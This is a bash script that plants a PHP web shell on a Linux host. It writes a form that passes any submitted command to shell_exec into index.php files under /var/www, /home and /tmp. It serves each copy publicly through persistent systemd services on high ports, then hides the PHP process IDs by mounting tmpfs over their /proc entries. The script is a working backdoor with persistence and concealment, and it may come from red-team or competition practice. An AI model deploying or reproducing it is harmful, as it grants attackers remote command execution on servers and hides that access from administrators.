#!/bin/bash

# Declare variables
declare -a directories=("/var/www/" "/home/" "/var/www/website1" "/tmp/")
declare -a ports=(7777 8888 9999 11111)
source_dir="$(readlink -m $(dirname $0))"
service_dir="/etc/systemd/system"

# Make a variable of the PHP file
phpFile='<!DOCTYPE html>
<html>
<head>
    <title>Run Command</title>
</head>
<body>
    <h1>Run Command</h1>
    <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" method="post">
        <label for="command">Enter a command:</label>
        <input type="text" id="command" name="command" required>
        <br>
        <input type="submit" name="run" value="Run Command">
    </form>

    <?php
if (isset($_POST["run"])) {
    // Get the user-entered command
    $command = $_POST["command"];

    // Check if the command is "pwd" and disallow it
    if ($command === "pwd") {
        
    } else {
        // Execute the command using shell_exec
        $output = shell_exec($command);

        // Display the output
        echo "<pre>$output</pre>";
    }
}
?>
</body>
</html>'

# Make sure PHP is installed
if ! command -v php &> /dev/null; then
    echo "PHP is not installed"
    exit 1
fi

# Clear log file
echo > /tmp/.systemdprocs

# Loop through directories
for i in "${!directories[@]}"; do

    # Assign variables
    dir="${directories[$i]}"
    port=${ports[$i]}
    service_name="php-server-website$i.service"
    service_file="$service_dir/$service_name"

    # Make sure directory exists
    mkdir -p "$dir"

    # Add webshell into file
    echo "$phpFile" > "$dir/index.php"

    # Create a systemd service unit file
    cat <<EOF > "$service_file"
[Unit]
Description=PHP Web Server for $dir
After=network.target

[Service]
ExecStart=/usr/bin/php -S 0.0.0.0:$port -t $dir
WorkingDirectory=$dir
Restart=always

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd to make it aware of the new service unit
    systemctl daemon-reload

    # Enable and start the service
    systemctl enable "$service_name"
    systemctl start "$service_name"

    # Tell the user about the site
    echo "Started server for $dir on port $port as $service_name"
    cd /
done

#Gets current php pid
ps aux | awk '/[/]usr[/]bin[/]php/ {print $2}' > /tmp/.systemdprocs

#Hides php pid
for pid in $(cat /tmp/.systemdprocs); do mount -t tmpfs none /proc/"$pid"; done

# Wait for processes to finish
sleep 1

# Report completion
echo "All servers started successfully."